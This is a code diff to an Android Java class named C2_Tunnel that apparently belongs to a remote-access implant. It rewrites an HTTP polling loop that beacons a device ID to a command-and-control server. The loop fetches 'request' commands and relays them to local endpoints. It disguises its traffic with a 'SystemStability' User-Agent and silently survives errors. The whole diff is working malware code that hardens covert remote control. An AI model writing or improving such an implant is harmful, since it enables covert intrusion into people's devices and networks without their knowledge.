@@ -12,10 +12,8 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
 
 /**
  * Tactical HTTP Polling Tunnel Engine.
@@ -24,13 +22,43 @@ import java.util.concurrent.TimeUnit;
 public class C2_Tunnel {
 
     private static final String TAG = "C2_Tunnel";
-    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
     private static volatile boolean isRunning = false;
+    private static volatile long lastPollSuccessTime = 0;
 
     public static synchronized void start(Context context) {
-        if (isRunning) return;
-        isRunning = true;
+        if (context == null) return;
+        
+        long now = System.currentTimeMillis();
+        // If thread is running and active within last 12s, skip duplicate launch
+        if (isRunning && (now - lastPollSuccessTime < 12000)) return;
 
+        isRunning = true;
+        lastPollSuccessTime = now;
+
+        Context appContext = context.getApplicationContext();
+
+        new Thread(() -> {
+            Log.d(TAG, "Initiating Resilient HTTP Polling Tunnel Uplink Loop");
+            FirebaseConfig.logActivity("TUNNEL_SYNC: HTTP polling proxy connected to C2.");
+
+            while (isRunning) {
+                try {
+                    pollOnce(appContext);
+                    lastPollSuccessTime = System.currentTimeMillis();
+                } catch (Throwable t) {
+                    Log.e(TAG, "Tunnel poll iteration error: " + t.getMessage());
+                }
+
+                try {
+                    Thread.sleep(1200);
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        }, "C2_Tunnel_Worker").start();
+    }
+
+    private static void pollOnce(Context context) {
         String c2Url = BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.trim().isEmpty()) return;
         if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;
@@ -47,51 +75,47 @@ public class C2_Tunnel {
         }
 
         String deviceId = C2_Uploader.getDeviceId(context);
-        String pollUrl = baseC2 + "/tunnel-poll?deviceId=" + deviceId;
-        String respUrl = baseC2 + "/tunnel-response";
+        HttpURLConnection conn = null;
+        try {
+            String encodedId = URLEncoder.encode(deviceId, "UTF-8");
+            String pollUrl = baseC2 + "/tunnel-poll?deviceId=" + encodedId;
+            String respUrl = baseC2 + "/tunnel-response";
 
-        Log.d(TAG, "Initiating HTTP Polling Tunnel Uplink: " + pollUrl);
-        FirebaseConfig.logActivity("TUNNEL_SYNC: HTTP polling proxy connected to C2.");
+            URL url = new URL(pollUrl);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
 
-        scheduler.scheduleWithFixedDelay(() -> {
-            if (!isRunning) return;
-            HttpURLConnection conn = null;
-            try {
-                URL url = new URL(pollUrl);
-                conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("GET");
-                conn.setConnectTimeout(10000);
-                conn.setReadTimeout(10000);
+            if (conn.getResponseCode() == 200) {
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        sb.append(line);
+                    }
+                    String responseStr = sb.toString().trim();
+                    if (!responseStr.isEmpty() && !responseStr.equals("{}")) {
+                        JSONObject cmd = new JSONObject(responseStr);
+                        String type = cmd.optString("type");
+                        String requestId = cmd.optString("id");
 
-                if (conn.getResponseCode() == 200) {
-                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
-                        StringBuilder sb = new StringBuilder();
-                        String line;
-                        while ((line = reader.readLine()) != null) {
-                            sb.append(line);
-                        }
-                        String responseStr = sb.toString().trim();
-                        if (!responseStr.isEmpty() && !responseStr.equals("{}")) {
-                            JSONObject cmd = new JSONObject(responseStr);
-                            String type = cmd.optString("type");
-                            String requestId = cmd.optString("id");
+                        if ("request".equals(type)) {
+                            String path = cmd.optString("path");
+                            String method = cmd.optString("method", "GET");
+                            String body = cmd.optString("body", "");
 
-                            if ("request".equals(type)) {
-                                String path = cmd.optString("path");
-                                String method = cmd.optString("method", "GET");
-                                String body = cmd.optString("body", "");
-
-                                LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId, respUrl, deviceId));
-                            }
+                            LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId, respUrl, deviceId));
                         }
                     }
                 }
-            } catch (Exception e) {
-                // Silent catch during network transition
-            } finally {
-                if (conn != null) conn.disconnect();
             }
-        }, 1, 2, TimeUnit.SECONDS);
+        } catch (Throwable t) {
+            // Silently survive network switches or transient server drops
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
     }
 
     private static void relayLocalRequest(String method, String path, String body, String requestId, String respUrl, String deviceId) {
